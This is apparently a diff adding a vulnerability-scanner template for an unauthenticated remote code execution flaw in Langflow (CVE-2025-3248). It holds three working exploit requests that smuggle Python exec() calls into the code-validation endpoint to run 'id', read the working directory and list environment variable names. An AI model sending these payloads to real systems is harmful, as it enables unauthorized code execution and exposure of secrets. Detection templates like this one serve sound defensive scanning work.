@@ -1,0 +1,60 @@
+id: cve-2025-3248
+
+info:
+  name: Langflow Unauthenticated RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Langflow is vulnerable to unauthenticated Remote Code Execution (RCE) via specially crafted code payloads sent to the `/api/v1/validate/code` endpoint. This template tests various exploitation vectors for RCE.
+  tags: rce,langflow,cve,critical
+
+http:
+  - raw:
+      - |
+        POST /api/v1/validate/code HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "code": "@exec('import subprocess; raise Exception(subprocess.check_output(\"id\", shell=True).decode())')\ndef foo():\n    pass"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid=1000"
+          - "gid=0"
+        part: body
+
+  - raw:
+      - |
+        POST /api/v1/validate/code HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "code": "def foo(x=exec('import os; raise Exception(os.getcwd())')):\n    pass"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/app"
+        part: body
+
+  - raw:
+      - |
+        POST /api/v1/validate/code HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "code": "@exec('import os; raise Exception(str(list(os.environ.keys())[:5]))')\ndef foo():\n    pass"
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PATH"
+          - "HOME"
+        part: body
